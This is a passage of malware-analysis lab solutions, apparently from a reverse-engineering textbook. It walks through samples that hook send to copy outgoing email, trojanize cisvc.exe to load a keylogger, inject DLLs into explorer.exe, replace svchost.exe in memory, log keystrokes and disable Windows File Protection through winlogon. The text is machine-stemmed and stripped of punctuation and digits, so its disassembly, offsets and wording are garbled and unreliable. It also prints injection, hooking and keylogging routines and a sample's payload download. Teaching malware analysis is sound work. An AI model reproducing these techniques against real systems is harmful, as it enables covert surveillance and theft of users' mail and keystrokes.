analyz instal export graph crossrefer instal shown figur c figur c crossrefer graph instal export see instal set valu registri copi file window system directori match saw dynam analysi confirm disassembl instal function purpos copi malwar spoolvxxdll set appinitdl valu exampl c focu dllmain start check dllprocessattach previou lab appear malwar run dllprocessattach otherwis dllmain return without anyth els exampl c code dllmain attempt open labini system directori e cmp ebpfdwreason dllprocessattach call getwindowssystemdirectori mov ebplpfilenam eax push h count e push offset alabini labini mov edx ebplpfilenam push edx dest call strncat c add esp ch f push htemplatefil push fileattributenorm dwflagsandattribut push openexist dwcreationdisposit push lpsecurityattribut push fileshareread dwsharemod c push genericread dwdesiredaccess mov eax ebplpfilenam push eax lpfilenam call dscreatefilea exampl c see window system directori retriev well string labini togeth form path strncat malwar attempt open ini file read file open dllmain return malwar success open ini file read file global buffer shown exampl c exampl c read decrypt ini file push offset bytea lpbuffer ab mov edx ebphobject ae push edx hfile af call ds readfil b cmp ebpnumberofbytesread b jbe short locd bb mov eax ebpnumberofbytesread mov byteaeax c push offset bytea ca call subb call readfil malwar check make sure file size greater next buffer contain file content pass subb subb look like might decod routin first function call open handl suspect encod file well call maybedecod test theori load malwar ollydbg set breakpoint xca make sure copi ini file malwar window system directori renam dll spoolvxxdll breakpoint hit step call maybedecod figur c show result figur c ollydbg show decod content labini figur c decrypt contentth email address billymalwareanalysisbookcom point eax email address store global variabl bytea renam emailaddress ida pro aid futur analysisw one last function analyz insid dllmain subb function instal inlin hook well renam hookinstal hookinstal function complic dive provid highlevel overview inlin hook look like instal figur c figur c send function hook instal left side figur c show normal call send function wsdll look like right side figur show hookinstal instal inlin hook send function start send function replac jump malici code call trampolin shown figur lowerright box trampolin simpli execut start send function overwritten first jump jump back origin send function send function oper hook instal hookinstal instal hook check see process malwar run call three function get current process name exampl c contain code first function sub exampl c call getmodulefilenamea get current process name push offset filenam lpfilenam mov eax ebphmodul push eax hmodul call dsgetmodulefilenamea c mov ecx ebparg f mov dword ptr ecx offset filenamea see getmodulefilenamea call return full path process dll load argument hmodul set call function next malwar return name arg string pointer pass function string pass two function pars filenam chang charact uppercas note malwar use appinitdl persist mechan commonli use getmodulefilenamea malici dll load everi process start system malwar author may want target certain process must determin name process malici code run next current process name uppercas letter compar process name thebatex outlookex msimnex string equal one filenam malwar exit howev malwar load one three process malici code seen exampl c execut exampl c malici code set inlin hook call subbd push offset dword int b push offset subd int push offset asend send push offset awsockdl wsockdll call suba f add esp h call sub exampl c sever function us analyz insid see call getcurrentprocessid subf renam suspendthread suspendthread function call getcurrentthreadid return thread identifi tid current thread execut next suspendthread call createtoolhelpsnapshot use result loop tid current process tid current thread suspendthread call use tid conclud function call suspend execut thread current process convers function call exact opposit resum thread use call resumethread conclud code exampl c surround two function suspend resum execut thisbehavior common malwar make chang could impact current execut chang memori instal inlin hook next examin code call function suba take four argument shown seri push exampl c sinc function call locat renam argument match pass function shown exampl c begin exampl c suba resolv send function suba proc near lpaddress dword ptr hmodul dword ptr wsockdll dword ptr sendfunct dword ptr ch psubd dword ptr h pdword dword ptr h push ebp mov ebp esp sub esp mov eax ebpwsockdl ac push eax lpmodulenam ad call dsgetmodulehandlea cf mov edx ebpsendfunct push edx lpprocnam mov eax ebphmodul push eax hmodul call dsgetprocaddress dd mov ebplpaddress eax exampl c see handl wsockdll obtain use getmodulehandlea handl pass getprocaddress resolv send function malwar end pass address send function two paramet subd dword sub renam placehook examin placehook renam argument accordingli order aid analysi exampl c show start placehook exampl c address calcul jump instruct mov eax ebpsubd c sub eax ebpsendaddress f sub eax mov ebpvar eax code exampl c calcul differ memori addressof send function start subd differ addit byte subtract move var var use later code prepend xe opcod jmp make byte instruct jump subd let see malwar instal code hook later placehook start send function modifi instruct shown exampl c exampl c inlin hook instal mov edx ebpsendaddress mov byte ptr edx eh mov eax ebpsendaddress mov ecx ebpvar mov eax ecx code copi xe opcod start send function follow copi var memori xe recal exampl c var contain destin jump subd code exampl c place jmp instruct begin send function jump function dll subd well renam hookfunct examin hookfunct let wrap analysi inlin hook instal exampl c show placehook manipul memori exampl c placehook sub manipul memori push ecx lpfloldprotect push pageexecutereadwrit flnewprotect b push dwsize mov edx ebpsendaddress push edx lpaddress call dsvirtualprotect push ffh size c call malloc add esp mov ebpvar eax exampl c placehook call virtualprotect start send function code action chang memori protect execut read write access therebi allow malwar modifi instruct send function anoth call virtualprotect end function restor origin memoryprotect set immedi call virtualprotect malwar alloc xff byte memori use malloc store result var dynam alloc memori willplay import role instal hook trampolin well renam var trampolin note order execut properli memori return call malloc must execut memori might alway case exampl data execut prevent dep enabl via noexecutealwayson similar exampl c show creation trampolin code exampl c trampolin creation inlin hook push size mov eax ebpsendaddress b push eax src c mov ecx ebptrampolin f add ecx push ecx dst call memcpi add esp ch b mov edx ebptrampolin e mov byte ptr edxah eh mov eax ebpsendaddress sub eax ebptrampolin sub eax ah b mov ecx ebptrampolin e mov ecxbh eax exampl c memcpi copi first byte send function trampolin sinc malwar overwrit first byte send instruct exampl c need make sure origin instruct save malwar assum send function first sever instruct align exactli byte might alway case next malwar add jmp instruct trampolin code xe opcod ad locat jump ad jump locat calcul subtract locat trampolin locat send function mean jump back send function final placehook end set global variabl dword trampolin locat renam dword trampolinefunct aid analysi next analyz hookfunct subd argument send function sinc instal hook begin ouranalysi rightclick function name select set function type enter follow int stdcall hookfunctionsocket char buf int len int flag hook function look string rcpt buf string isnt found malwar call trampolinefunct caus send oper hook instal otherwis code exampl c execut exampl c creat string add recipi push offset arcptto rcpt lea ecx ebpdst push ecx dst call memcpi push offset emailaddress src lea edx ebpeaxdst f push edx dst call memcpi push offset sourc rn ad lea eax ebpdst b push eax dest b call strcat code exampl c build string ad outgo buffer string start rcpt follow emailaddress end rn emailaddress valu case billymalwareanalysisbookcom extract labini explain earlier look content file code add recipi outgo email messag lowlevel hook oper summari here summari hook oper also illustr highlevel figur c shown earlier program call send function first instruct send function transfer execut subd subd manipul outgo buffer contain rcpt string subd call trampolin code locat heap point dword trampolin code execut first three origin instruct send function overwrot instal hook trampolin code jump back send function byte send function normal examin hook ollydbg examin inlin hook use ollydbg instal malwar launch outlook express outlook express bundl microsoft window xp run msimnex attach process use file attach select msimnex process list attach process immedi paus thread examin memori map see spoolvxxdll load process appinitdl valu next examin send press ctrl g enter send text box figur c show start send function jmp hook subd like set breakpoint jump analyz code runtim figur c examin inlin hook send function msimnex captur network traffic captur malwar action see manipul network traffic set safe environ follow turn hostonli network virtual machin instal malwar virtual machin command rundllex labexeinstal copi labini cwindowssystem launch wireshark start captur packet virtual machinenetwork interfac set outlook express send email host system run fake mail server host machin command python smtpd n c debuggingserv ip ip ip address host machin send email outlook express review packet captur wireshark select follow tcp stream email messag summari lab solut malici dll export instal instal malwar persist use appinitdl caus malwar load process malwar check see load mail client use preset list process name target malwar determin run insid one process act usermod rootkit instal inlin hook send function hook take form jmp instruct place begin send function hook execut function scan everi data buffer pass send function search rcpt malwar find rcpt string insert addit rcpt contain email address retriev decod labini essenti copi malwar author everi email sent target email programslab solut short answer labex contain string inetepardl net start cisvc mean probabl start cisvc index servic labdll contain string cwindowssystemkernelxdl import api call getasynckeyst getforegroundwindow make us suspect keylogg log kernelxdl malwar start copi labdll inetepardl window system directori malwar write data cisvcex start index servic malwar also appear write keystrok cwindowssystemkernelxdl malwar persist instal labdll trojan index servic entrypoint redirect redirect entri point run shellcod load dll malwar infect cisvcex load inetepardl call export zzz labdll poll keylogg implement export zzz malwar store keystrok window keystrok enter cwindowssystemkernelxdl detail analysi well begin analysi examin string import labex labdll labex contain string inetepardl net start cisvc net start command use start servic window machin dont yet know malwar would start index servic system well dig indepth analysi labdll contain string cwindowssystemkernelxdl import api call getasynckeyst getforegroundwindow make us suspect keylogg log keystrok kernelxdl dll also contain oddli name export zzz next use dynam analysi techniqu see malwar runtim set procmon filter labex see malwar creat cwindowssysteminetepardl dll inetepardl ident labdll tell us malwar copi labdll window system directori procmon output see malwar open handl cisvcex dont see writefil oper final malwar start index servic issu command net start cisvc use process explor see cisvcex run system sinc suspect malwar might log keystrok open notepadex enter bunch charact see kernelxdl creat suspect keystrok log open kernelxdl hex editor see follow output untitl notepad x untitl notepad x untitl notepad x untitl notepad x keystrok log kernelxdl also see program type keystrok notepad log along keystrok data hexadecim malwar doesnt turn hexadecim valu readabl string malwar author probabl postprocess script easili read enter next use indepth techniqu determin malwar start servic keylogg gain execut begin load labex ida pro examin main function shown exampl c exampl c review main method labex db push offset newfilenam cwindowssystem inetepardl e push offset existingfilenam labdll e call dscopyfilea eb push offset acisvcex cisvcex f push offset format cwindowssystem f lea eax ebpfilenam fb push eax dest fc call sprintf add esp ch lea ecx ebpfilenam push ecx lpfilenam b call sub add esp push offset anetstartcisvc net start cisvc call system see main method begin copi labdll inetepardl cwindowssystem next build string cwindowssystemcisvcex pass sub final malwar start index servic use system run command net start cisvc focu sub see might cisvcex lot confus code sub take highlevel look function use crossrefer diagram shown figur c figur c crossrefer graph sub use diagram see sub map cisvcex file memori order manipul call createfilea createfilemappinga mapviewoffil function open file read write access start address memorymap view return mapviewoffil label lpbaseaddress ida pro read written chang made file written disk call unmapviewoffil explain didnt see writefil function procmon output sever calcul check appear made pe header cisvcex rather analyz complex manipul let focu data written file extract version cisvcex written disk analysi buffer written memorymap file shown exampl c exampl c write byte shellcod cisvcex c mov edi ebplpbaseaddress f add edi ebpvar mov ecx eh mov esi offset byte c rep movsd map locat file move edi adjust offset use var next ecx load xe number dword towrit movsd therefor total number byte xe byte decim final byte move esi rep movsd copi data byte map file examin data x see byte left side tabl c tabl c shellcod written cisvcex raw byte disassembl unk db h db h db eh db h db ech db h push ebp mov ebp esp sub esp h jmp loc left side tabl contain raw byte put cursor x press c ida pro get disassembl shown right side tabl shellcodehandcraft assembl case use process inject rather analyz shellcod bit complic messi well guess base string contain toward end byte shellcod see two string acwindowssystem db cwindowssysteminetepardl azzz db zzz appear path inetepardl export zzz suggest shellcod load dll call export next compar cisvcex binari exist run malwar clean version exist malwar run hex editor provid comparison tool compar version see two differ insert byte shellcod byte chang pe header load binari peview see notic differ pe header comparison shown figur c figur c peview origin trojan version cisvcex top part figur c show origin cisvcex name cisvcoriginalex load peview bottom part show trojan cisvcex see entri point differ two binari load binari ida pro see malwar perform entri point redirect shellcod run origin entri point time cisvcex launch exampl c show snippet shellcod trojan version cisvcex exampl c import call within shellcod insid trojan cisvcex ba call dword ptr ebp bd mov ebph eax b lea eax ebxh b push eax b mov eax ebph ba push eax bb call dword ptr ebpch mov ebp eax b call dword ptr ebp b mov esp ebp b pop ebp b jmp wmaincrtstartup load trojan version cisvcex debugg set breakpoint xba find malwar call loadlibrari load inetepardl memori malwar call getprocaddress argument zzz get address export function themalwar call zzz final malwar jump origin entri point servic run would normal shellcod function match earlier suspicion load inetepardl call export keylogg analysi next analyz inetepardl labdll load labdll ida pro begin analyz file major code stem zzz export export start thread return focu analyz thread shown exampl c exampl c mutex file creation perform thread creat zzz push offset name mz push binitialown push lpmutexattribut call dscreatemutexa bd push htemplatefil bf push h dwflagsandattribut c push dwcreationdisposit c push lpsecurityattribut c push dwsharemod ca push ch dwdesiredaccess cf push offset filenam cwindowssystem kernelxdl call dscreatefilea malwar creat mutex name mz mutex prevent malwar run one instanc sinc previou call openmutex shown termin thread mutex mz alreadi exist next malwar open creat file name kernelxdl write get handl kernelxdl malwar set file pointer end file call sub contain loop loop contain call getasynckeyst getforegroundwindow writefil consist keylog method discuss userspac keylogg summari labex trojan start window index servic cisvcex trojan shellcod load dll call export function launch keylogg export creat mutex mz log keystrok kernelxdl window system directorylab solut short answer run malwar popup messag display screen everi minut process inject explorerex restart explorerex process malwar perform dll inject launch labdll within explorerex labdll inject display messag box screen everi minut counter show mani minut elaps detail analysi let begin basic static analysi examin import labex see createremotethread writeprocessmemori virtualallocex base discuss chapter know probabl deal form process inject therefor first goal determin code inject process examin string malwar see notabl one includ explorerex labdll psapidl next use basic dynam techniqu see malwar run run malwar creat messag box everi minut quit annoy tri use analysi tool procmon doesnt use inform process explor show obviou process run network function appear import shift ida pro determin produc messag box line start main function see malwar resolv function window process enumer within psapidl exampl c contain one exampl three function malwar manual resolv use loadlibrarya getprocaddress exampl c dynam resolv process enumer importsf push offset procnam enumprocessmodul push offset libfilenam psapidl call ds loadlibrarya f push eax hmodul call ds getprocaddress mov dword eax malwar save function pointer dword dwordc dword chang global variabl easili identifi function call later analysi renam myenumprocessmodul mygetmodulebasenamea myenumprocess exampl c renam dword myenumprocessmodul dynam resolut function code call dword enumprocess retriev pid process object system enumprocess return array pid referenc local variabl dwprocessid dwprocessid use loop iter process list call sub pid examin sub see dynam resolv import enumprocessmodul call openprocess pid pass function next see call dwordc getmodulebasenamea shown exampl c exampl c string compar explorerex push h lea ecx ebpstr push ecx mov edx ebpvarc push edx b mov eax ebphobject e push eax f call dwordc getmodulebasenamea push ch maxcount push offset str explorerex c lea ecx ebpstr push ecx str call strnicmp dynam resolv function getmodulebasenamea use translat pid process name call see comparison string obtain getmodulebasenamea str explorerex str malwar look explorerex process memori explorerex found function sub return themain function call openprocess open handl malwar obtain handl process success code exampl c execut handl hprocess use manipul process exampl c write string remot process c push flprotect e push h flallocationtyp push h dwsize push lpaddress mov edx ebp hprocess push edx hprocess call ds virtualallocex mov ebp lpparamet eax ad cmp ebplpparamet b jnz short locb push lpnumberofbyteswritten c push h nsize c lea eax ebp buffer cb push eax lpbuffer cc mov ecx ebp lpparamet push ecx lpbaseaddress mov edx ebp hprocess push edx hprocess da call ds writeprocessmemori exampl c see call virtualallocex dynam alloc memori explorerex process x byte alloc push dwsize virtualallocex success pointer alloc memori move lpparamet pass process handl writeprocessmemori order write data explorerex data written process referenc buffer paramet bold order understand inject trace code back buffer set find set path current directori append lab dll conclud malwar write path labdll explorerex process malwar success write path dll explorerex code exampl c execut exampl c creat remot thread e push offset modulenam kerneldl e call ds getmodulehandlea eb mov ebphmodul eax f push offset aloadlibrarya loadlibrarya f mov eax ebphmodulefc push eax hmodul fd call ds getprocaddress mov ebplpstartaddress eax push lpthreadid b push dwcreationflag mov ecx ebplpparamet push ecx lpparamet mov edx ebplpstartaddress push edx lpstartaddress b push dwstacksiz push lpthreadattribut f mov eax ebp hprocess push eax hprocess call dscreateremotethread exampl c call getmodulehandlea getprocaddress bold use get address loadlibrarya address loadlibrarya explorerex malwar labex address loadlibrarya insert lpstartaddress shown lpstartaddress provid createremotethread order forc explorerex call load librarya paramet loadlibrarya pass via createremotethread lpparamet string contain path labdll turn start thread remot process call loadlibrarya paramet labdll conclud malwar execut perform dll inject labdll explorerex know inject tri stop annoy popup launch process explor help us shown figur c select explorerex process list choos view show lower pane view lower pane view dll scroll result window see labdll list load explorerex memori space use process explor easi way spot dll inject use confirm ida pro analysi stop popup use process explor kill explorerex restart select file run enter explor figur c process explor view show inject dll analyz labex move labdll see someth addit creat messag box analyz labdll ida pro see littl creat thread creat anoth thread code exampl c first thread loop creat thread everi minut xea millisecond exampl c analyz thread creat labdll mov ecx ebpvar push ecx push offset format practic malwar analysi f lea edx ebpparamet push edx dest call sprintf add esp ch b push lpthreadid push dwcreationflag f lea eax ebpparamet push eax lpparamet push offset startaddress lpstartaddress push dwstacksiz push lpthreadattribut c call ds createthread push eah dwmillisecond call ds sleep mov ecx ebp var add ecx mov ebpvar ecx new thread label startaddress ida pro creat messag box say press ok reboot take paramet titl box set sprintf paramet format string practic malwar analysi replac counter store varthat increment conclud dll noth produc annoy messag box increment one everi minutelab solut short answer purpos program covertli launch anoth program program use process replac hide execut malici payload store program resourc section resourc type unicod name local malici payload store program resourc section xor encod decod routin found subc xor byte found xb string xorencod use function sub detail analysi sinc weve alreadi analyz binari lab chapter let begin open file ida pro look function import mani function list provid littl inform commonli import window execut stand specif cre ateprocessa getthreadcontext setthreadcontext indic program creat new process modifi execut context process import readprocessmemori writeprocessmemori tell us program read write directli process memori space import lockresourc sizeofresourc tell us data import process may store well focu first purpos createprocessa function call found locat xf shown exampl c exampl c creat suspend process access main thread context lea edx ebpprocessinform push edx lpprocessinform lea eax ebpstartupinfo c push eax lpstartupinfo push lpcurrentdirectori f push lpenviron push dwcreationflag push binherithandl push lpthreadattribut push lpprocessattribut push lpcommandlin b mov ecx ebplpapplicationnam e push ecx lpapplicationnam f call ds createprocessa mov ecx ebpprocessinformationhthread push ecx hthread call dsgetthreadcontext exampl c see push ida pro label paramet dwcreationflag msdn document createprocess tell us createsuspend flag allow process creat start process execut main process thread start via resumethread api see program access context thread hthread paramet getthreadcontext come buffer pass createprocessa tell us program access context suspend thread obtain thread handl import program use thread handl interact suspend process call getthreadcontext see context use call readprocessmemori better determin program context need add context structur ida pro add standard structur click structur tab press in key next click add standard structur button locat structur name context youv ad structur rightclick locat xc allow resolut structur offset shown figur c see offset xa actual refer ebx regist thread eaxcontextebx figur c ida pro structur offset resolutionth ebx regist suspend newli creat process alway contain pointer process environ block peb data structur shown exampl c program increment peb data structur byte push valu onto stack start address memori read exampl c read peb data structur b push lpnumberofbytesread ba push nsize bc lea edx ebpbuff bf push edx lpbuffer c mov eax ebplpcontext c mov ecx eaxcontextebx c add ecx cc push ecx lpbaseaddress cd mov edx ebpprocessinformationhprocess push edx hprocess call ds readprocessmemori peb data structur part standard ida pro data structur use internet search windbg help determin offset peb data structur pointer imagebaseaddress start load execut pass address read locat read byte see ida pro label buffer contain imagebas suspend process program manual resolv import unmapviewofsect use get procaddress xe xfe imagebaseaddress paramet unmapviewofsect call unmapviewofsect remov suspend process memori point program longer execut exampl c see paramet push onto stack call virtualallocex exampl c alloc memori execut within suspend process push h flprotect b push h flallocationtyp mov edx ebpvar mov eax edxh push eax dwsize mov ecx ebpvar mov edx ecxh push edx lpaddress e mov eax ebpprocessinformationhprocess push eax hprocess call dsvirtualallocexnotic list show program alloc memori within suspend process address space behavior requir investig begin function program check mz magic valu xfe pe magic valu x check valid know var contain pointer pe header load memori program request memori alloc address imagebas bufferbas pe file tell window loader execut would prefer load memori program request size memori specifi pe header valu images offset x final use msdn document determin memori alloc pageexecutereadwrit permiss memori alloc writeprocessmemori x write data begin pe file memori alloc within suspend process number byte written taken offset x pe header sizeofhead first writeprocessmemori copi pe file header suspend process suggest program move pe file anoth processs address space next exampl c see loop loop counter var initi x exampl c copi pe section memori mov ebpvar e jmp short loc loc code xref subeacdj mov eax ebpvar add eax mov ebpvar eax loc code xref subeaj mov ecx ebpvar c xor edx edx e mov dx ecx cmp ebpvar edx jge short locb mov eax ebpvar mov ecx ebplpbuff add ecx eaxch mov edx ebpvar imul edx h lea eax ecxedxfh mov ebpvar eax push lpnumberofbyteswritten mov ecx ebpvar mov edx ecxh push edx nsize mov eax ebpvar c mov ecx ebplpbuff f add ecx eaxh push ecx lpbuffer mov edx ebpvar mov eax ebplpbaseaddress add eax edxch ac push eax lpbaseaddress ad mov ecx ebpprocessinformationhprocess b push ecx hprocess b call dswriteprocessmemori b jmp short loc loop counter compar valu offset byte pe header numberofsect execut section contain data necessari run executablesuch code data reloc onw know loop probabl copi pe execut section suspend process let sure var contain pointer mzpe file memori label lpbuffer ida pro initi locat xf know first part pe execut mz header see program ad offset xc offset pe header mz header buffer make ecx point begin pe header see pointer obtain edx first time loop remov edx pointer calcul leav us ecx xf look pe header offset see xf start imageheadersect array simpl sizeofimageheadersect tell us structur byte match multipl perform loop counter leverag ida pro standard structur ad imagedoshead imagenthead imagesectionhead use knowledg weve gain regist differ stage transform disassembl exampl c much readabl version exampl c chang bold list exampl c copi pe section memori use ida pro structur loc code xref subeacdj mov eax ebpvar add eax mov ebpvar eax loc code xref subeaj mov ecx ebpvar c xor edx edx e mov dxecx imagentheadersfileheadernumberofsect cmp ebpvar edx jge short locb mov eax ebpvar mov ecx ebplpbuff add ecx eax imagedosheaderelfanew mov edx ebpvar imul edx h lea eax ecxedx size imagenthead mov ebpvar eax push lpnumberofbyteswritten mov ecx ebpvar mov edx ecx imagesectionheadersizeofrawdata push edx nsize mov eax ebpvar c mov ecx ebplpbuff f add ecx eax imagesectionheaderpointertorawdata push ecx lpbuffer mov edx ebpvar mov eax ebplpbaseaddress add eax edx imagesectionheadervirtualaddress ac push eax lpbaseaddress ad mov ecx ebpprocessinformationhprocess b push ecx hprocess b call dswriteprocessmemori b jmp short loc exampl c much easier see sizeofrawdata pointertorawdata virtualaddress valu section header use perform copi oper confirm earlier suspicion program copi section suspend processs memori space program taken necessari step load execut anoth processs address space exampl c see program use setthreadcontext set eax regist entri point execut load suspend processs memori space program perform resumethread success achiev process replac process creat use createprocessa begin function exampl c resum suspend process db mov eax ebpvar de mov ecx ebplpbaseaddress e add ecx eaximagentheadersoptionalheaderaddressofentrypoint e mov edx ebplpcontext e mov edxcontexteax ecx ed mov eax ebplpcontextf push eax lpcontext f mov ecx ebpprocessinformationhthread f push ecx hthread f call ds setthreadcontext fb mov edx ebpprocessinformationhthread fe push edx hthread ff call dsresumethread know process replac occur import determin process replac process covertli execut cloak within anoth first need discov origin lpapplicationnam label creat ida pro seen exampl c provid createprocessa api call press ctrl x cursor start subea function show crossrefer includ caller subb main follow main bring us x variabl dst load regist pass subea process name createprocessa place cursor dst highlight variabl throughout function therebi allow us follow variabl order determin origin variabl first seen shown exampl c second paramet subd exampl c build path string push h usiz lea eax ebpdst push eax str push offset asvchostex svchostex call subd quick look subd show simpl function copi systemrootsystem second paramet concaten first paramet onto end sinc dst second paramet receiv new path backtrack first paramet subd see svchostex tell us replac process systemrootsystemsvchostex know program start svchostex still need determin process replac svchostex follow pe buffer pass subea follow variabl lpbuffer x backtrack dst earlierw locat lpbuffer receiv eax exampl c examin earlier instruct find function call rememb eax return valu function know buffer come function subc appear take variabl hmodul memori pointer program labex exampl c load execut replac svchostex mov ecx ebphmodul push ecx hmodul call subc add esp mov ebplpbuff eax function subc call function findresourc loadresourc lockresourc sizeofresourc virtualalloc memcpi program copi data execut resourc section memori well use resourc hacker view item resourc section export independ file figur c show labex insid resourc hacker encod binari resourc section use resourc hacker export binari point need continu examin disassembl determin execut decod x see buffer pass function sub look like xor routin look back third paramet pass function locat xb see x use winhex quickli xor entir file export earlier resourc hacker select edit modifi data xor enter x perform convers valid pe execut later use replac instanc svchostex figur c resourc hacker show encod binari resourc section note winhex hex editor avail httpwwwxwaysnetwinhex free trial version use malwar analysi use illustr purpos hex editor perform singlebyt xor oper conclud malwar decod binari resourc section perform process replac svchostex decod binarylab solut short answer program keylogg program use hook inject steal keystrok program creat file practicalmalwareanalysislog store keystrok detail analysi sinc weve alreadi analyz binari lab chapter extract part lab solut let begin open file ida pro examin function import interest import setwindowshookexa api allow applic hook monitor event within microsoft window exampl c see setwindowshookexa call main msdn document show first paramet dh correspond whkeyboardl enabl monitor keyboard event use hook function ida pro label fn program probabl someth keystrok fn function receiv keystrok exampl c setwindowshookex call main push eax hmod push offset fn lpfn push dh idhook b call dssetwindowshookexa mov ebphhk eax regist receiv keyboard event program call getmessagea loop start x program must call getmessagea otherwis window would deliv messag processs hook function loop run produc error navig function fn begin see program keystrok captur fn gener function three paramet prototyp defin hookproc use msdn document determin whkeyboardl callback actual lowlevelkeyboardproc callbacksw use inform resolv paramet actual data structur make job easier allow us read name rather numer offset chang ida display offset name put cursor x press key chang lparam type kbdllhookstruct go xa hit key select kbdllhookstructvkcod refer lparam show structur variabl name rather numer offset exampl eax xa becom eaxkbdllhooksstructvkcod shown exampl c exampl c hook function f cmp ebpwparam wmsyskeydown jz short loca cmp ebpwparam wmkeydown f jnz short locaf loca code xref fnj mov eax ebplparam mov ecx eaxkbdllhookstructvkcod push ecx buffer call subc exampl c see program check type keypress cmp order process keypress program pass mov virtual key code function subc shown later bold examin subc see first program open file practicalmalwareanalysislog malwar call getforegroundwindow follow getwindowtexta shown exampl c first getforegroundwindow select activ window key press grab titl window use getwindowtexta help program provid context keystrok origin exampl c open log file get window titl e push offset filenam practicalmalwareanalysislog eb call dscreatefilea f push h nmaxcount push offset string lpstring call ds getforegroundwindow f push eax hwnd call ds getwindowtexta push offset string str b push offset dest str call strcmponc program write window titl log file enter larg jump tabl shown exampl c recogn varc contain virtual key code pass function see virtual key code use index lookup tabl valu receiv lookup tabl use index jump tabl exampl c virtual key code jump tabl b sub eax b mov edx ebpvarc e xor ecx ecx mov cl dsbytededx jmp dsoffecx switch jump follow lookup process choos valu like vkshift x subtract valu leav us x x x look offset x byte shown exampl c provid valu store ecx ecx multipli yield xc use offset return locat loc find string shift written log file exampl c offset tabl byte byte db h h db h h h db h h abl conclud malwar keylogg log keystrok file practicalmalwareanalysislog keylogg use setwindowshookex implement keylog functionalitylab solut short answer malwar check see given pid winlogonex winlogonex process inject dll sfcosdll use disabl window file protect fourth argument pass createremotethread function pointer unnam ordin sfcterminatewatcherthread sfcosdll malwar drop binari resourc section overwrit old window updat binari wupdmgrex overwrit real wupdmgrex malwar copi temp directori later usag malwar inject remot thread winlogonex call function export sfcosdll ordin sfcterminatewatcherthread disabl window file protect next reboot createremotethread call necessari function must execut insid winlogonex process malwar trojan wupdmgrex use execut updat malwar call origin window updat binari save temp directori detail analysi begin basic static analysi examin import see createremotethread writeprocessmemori virtualallocex interest also see import resourc manipul loadresourc findresourcea examin malwar resourc hacker notic addit program name bin store resourc section next turn basic dynam techniqu procmon show us malwar creat file tempwinupex overwrit window updat binari systemrootsystemwupdmgrex compar drop wupdmgrex file bin resourc section see window file protect restor origin file doesnt run netcat wefind malwar attempt download updaterex wwwpracticalmalwareanalysiscom shown exampl c exampl c http get request perform run labex get updaterex http accept acceptencod gzip deflat userag mozilla compat msie window nt sv net clr net clr net clr net clr host wwwpracticalmalwareanalysiscom connect keepal load malwar ida pro scroll main function address x line start main function see malwar resolv function window process enumer within psapidl shown exampl c exampl c dynam resolv process enumer import aa push offset procnam enumprocessmodul af push offset apsapidl psapidl b call ds loadlibrarya ba push eax bb call ds getprocaddress c mov dwordc eax renam myenumprocessmodul exampl c also show one three function malwar manual resolv use loadlibrarya getprocaddress malwar save function pointer dwordc dword dword well chang name global variabl make easier identifi call function later analysi renam myenumprocessmodul mygetmodulebasenamea myenumprocess malwar check valu function pointer arriv x call myenumprocess shown exampl c goal code list return array pid system start array referenc local variabl dwprocessid shown exampl c enumer process lea eax ebpvar push eax dword push h dword f lea ecx ebpdwprocessid push ecx dword call myenumprocess c test eax eax e jnz short loc malwar begin loop pid pass subroutin x shown exampl c see index array referenc dwprocessid calcul call sub exampl c loop pid mov eax ebpvar b mov ecx ebpeax dwprocessid push ecx dwprocessid call sub examin intern sub see two local variabl set str str shown exampl c variabl str contain string real str contain winlogonex exampl c initi string mov eax dword ptr awinlogonex winlogonex f mov dword ptr ebp str eax c mov ecx dword ptr anotr real mov dword ptr ebp str ecx next malwar pass loop paramet dwprocessid openprocess call order obtain handl process shown exampl c handl return openprocess store eax pass myenumprocessmodul function return array handl modul load process exampl c process enumer modul push edx dwprocessid push binherithandl push h dwdesiredaccess call dsopenprocess lea eax ebpvar push eax e push lea ecx ebpvarc push ecx mov edx ebphobject push edx b call myenumprocessmodul shown exampl c malwar attempt get base name themodul pid use getmodulebasenamea succe str contain string base name modul pid pass subroutin keep initi valu real exampl c get name modul push h aa lea eax ebpstr chang b push eax b mov ecx ebpvarc b push ecx b mov edx ebphobject bb push edx bc call mygetmodulebasenamea old initi string real name base modul return getmodulebasenamea string compar win logonex string string match eax equal function return eax equal string match eax equal return safe say sub attempt determin pid associ winlogonex know sub renam pidlookup notic exampl c return valu eax test see code jump loccf increment loop counter rerun pidlookup function new pid otherwis pid match winlogonex pid pass sub seen list exampl c pid lookup comparison call pidlookup add esp ab mov ebpvar eax b cmp ebpvar b jz short loccf e mov ecx ebpvar ea push ecx dwprocessid eb call sub examin sub see anoth subroutin call immedi argument sedebugprivileg function perform sedebugprivileg privilegeescal procedur discuss extens chapter follow sedebugprivileg escal function see sfcosdll passedto loadlibrarya shown exampl c next getprocaddress call handl sfcosdll ordin undocu window function ordin push onto stack function pointer ordin save lpstartaddress label provid ida pro malwar call openprocess pid winlogonex dwdesiredaccess xffff symbol constant processallaccess handl winlogonex save hprocess exampl c resolv ordin sfcosdll open handl winlogon push lpprocnam push offset libfilenam sfcosdll call ds loadlibrarya ae push eax hmodul af call ds getprocaddress b mov lpstartaddress eax ba mov eax ebpdwprocessid bd push eax dwprocessid push binherithandl c push ffffh dwdesiredaccess c call ds openprocess cb mov ebphprocess eax ce cmp ebphprocess jnz short locd code exampl c call createremotethread examin argument createremotethread see hprocess paramet edx winlogonex handl lpstartaddress pass pointer function sfcosdll ordin inject thread winlogonex sfcosdll alreadi load insid winlogonex need load dll within newli creat remot thread dont call writeprocessmemori thread ordin sfcosdll exampl c call createremotethread remot process push lpthreadid da push dwcreationflag dc push lpparamet de mov ecx lpstartaddress e push ecx lpstartaddress e push dwstacksiz e push lpthreadattribut e mov edx ebphprocess ec push edx hprocess ed call ds createremotethread sfcosdll export ordin dll sfcosdll partiallyrespons window file protect seri thread run within winlogonex ordin sfcosdll unnam export known sfcterminatewatcherthread note inform sfcosdll export ordin given undocu avoid need reverseengin window dll search internet sfcosdll ordin see inform find sfcterminatewatcherthread must run insid winlogonex order success execut forc sfcterminatewatcherthread function execut malwar disabl window file protect next system reboot thread inject properli code exampl c execut build string code execut getwindowsdirectorya return pointer current window directori usual cwindow malwar pass string systemwupdmgrex snprintf call shown code typic build string cwindowssystemwupdmgrex store existingfilenam wupdmgrex use window updat window xp exampl c build string wupdmgrex path push eh usiz b lea edx ebpbuff push edx lpbuffer call ds getwindowsdirectorya push offset asystemwupdmg systemwupdmgrex lea eax ebpbuff push eax push offset ass ss push eh count e lea ecx ebp existingfilenam push ecx dest call ds snprintf exampl c see anoth string built call gettemppatha give us pointer current user temporari directori usual cdocument settingsusernamelocaltemp temporari directori path pass anoth snprintf call 